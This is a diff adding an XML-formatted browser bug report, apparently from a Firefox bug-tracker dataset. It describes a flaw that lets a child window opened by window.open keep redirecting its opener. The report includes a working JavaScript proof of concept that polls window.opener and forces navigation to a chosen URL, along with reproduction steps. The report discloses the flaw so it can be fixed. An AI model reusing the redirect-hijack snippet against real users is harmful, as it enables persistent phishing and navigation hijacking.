@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<bug>
+    <id>542160</id>
+    <title>Restrict window navigation to prevent persistent phish/hijack</title>
+    <description>
+        <paragraph id="1">
+            <sentence id="1.1">User-Agent:       Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-us) AppleWebKit/532.9+ (KHTML, like Gecko) Version/4.0.2 Safari/530.19
+Build Identifier: 3.6</sentence>
+        </paragraph>
+        <paragraph id="2">
+            <sentence id="2.1">By spawning a child window (window.open()) you can have a script running in the
+child regularly checking if window.opener.href is undefined, when it is
+undefined you can direct window.opener.location.href to any url you please</sentence>
+        </paragraph>
+        <paragraph id="3">
+            <sentence id="3.1">window.open('javascript:document.write(' + "'" + '&lt;script&gt;var int =
+setInterval(function() {try{var a = window.opener.location.href} catch (e)
+{window.opener.location.href="http://www.google.com/";clearInterval(int);} if
+(window.opener.location.href == undefined) { window.opener.location.href =
+"http://www.google.com"; clearInterval(int);}},100);&lt;/script&gt;' + "'" + ');');
+window.focus();</sentence>
+        </paragraph>
+        <paragraph id="4">
+            <sentence id="4.1">Reproducible: Always</sentence>
+        </paragraph>
+        <paragraph id="5">
+            <sentence id="5.1">Steps to Reproduce:</sentence>
+            <sentence id="5.2">Run the above code and attempt to change your address bar to</sentence>
+            <sentence id="5.3">http://www.yahoo.com, press enter and you will be directed to</sentence>
+            <sentence id="5.4">http://www.google.com</sentence>
+            <sentence id="5.5">Actual Results:</sentence>
+            <sentence id="5.6">Attempt to navigate to a page through the address bar, a book mark, or any other means results in the user being directed to a target url specified in the code above</sentence>
+        </paragraph>
+        <paragraph id="6">
+            <sentence id="6.1">Expected Results:  
+Javascript access to parent window that is no longer of the same domain should be denied</sentence>
+        </paragraph>
+    </description>
+</bug>
